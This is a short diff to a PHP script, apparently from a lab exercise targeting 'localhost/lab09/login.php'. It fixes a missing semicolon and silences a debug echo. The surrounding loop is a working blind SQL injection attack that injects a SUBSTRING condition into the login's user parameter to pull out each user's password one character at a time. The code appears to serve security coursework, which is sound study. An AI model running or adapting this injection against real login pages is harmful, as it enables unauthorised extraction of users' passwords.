@@ -91,8 +91,8 @@ for($id = 1; $id <= 100; $id++){
 	for ($i = 1; $i <= $sizepwd; $i++) {
 		foreach (range(10,127) as $character){
 			//$letter = utf8_encode(chr($character));
-			$letter = mb_convert_encoding (chr($character), 'UTF-8', 'ISO-8859-1')
-         	echo "$letter \n";
+			$letter = mb_convert_encoding (chr($character), 'UTF-8', 'ISO-8859-1');
+         	//echo "$letter \n";
 
 			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
 			$result = file_get_contents($url);
